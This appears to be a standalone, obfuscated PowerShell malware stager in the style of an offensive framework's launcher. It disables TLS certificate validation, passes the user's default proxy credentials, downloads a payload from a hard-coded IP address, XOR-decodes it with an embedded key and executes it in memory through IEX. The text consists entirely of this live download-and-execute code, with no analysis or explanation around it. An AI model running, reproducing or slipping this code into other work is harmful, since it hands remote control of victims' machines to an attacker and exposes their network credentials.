
$wc=NeW-OBJEcT SySTEM.Net.WeBClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEAdeRS.ADD('User-Agent',$u);$wC.ProxY = [System.Net.WeBREQUEST]::DEFaULtWebPrOxy;$wc.Proxy.CRedEnTIAls = [SySTEM.Net.CREDenTiAlCAChE]::DefAultNetWoRKCREdentIALS;$K='D~n<[!NQ(i@$A.1j;|a-/J9m74vr^BMR';$I=0;[ChAR[]]$b=([Char[]]($Wc.DOWnlOadSTRING("https://146.148.58.157:8088/index.asp")))|%{$_-BXor$k[$i++%$K.LeNGth]};IEX ($B-JOiN'')

